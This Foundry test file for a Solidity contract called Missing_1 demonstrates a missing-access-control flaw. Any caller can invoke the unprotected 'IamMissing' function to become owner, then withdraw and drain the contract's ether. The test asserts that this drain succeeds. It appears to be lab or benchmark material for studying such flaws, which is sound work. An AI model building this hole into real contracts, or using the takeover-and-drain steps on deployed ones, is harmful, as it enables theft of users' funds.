
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_1} from "../src/Missing_1.sol";

contract TestAccessControlMissing_1 is Test {

    Missing_1 public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new Missing_1();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        // --- 2. State Configuration ---
        // Fund the contract so withdraw has something to transfer
        vm.deal(address(_contractUnderTest), 1 ether);

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the unprotected IamMissing function - this allows anyone to become owner
        _contractUnderTest.IamMissing();

        // Now the caller should be the owner and can withdraw funds
        vm.prank(caller);
        _contractUnderTest.withdraw();

        // Assert that the caller successfully drained the contract
        assertEq(address(_contractUnderTest).balance, 0);
        assertEq(caller.balance, 1 ether);
    }
}
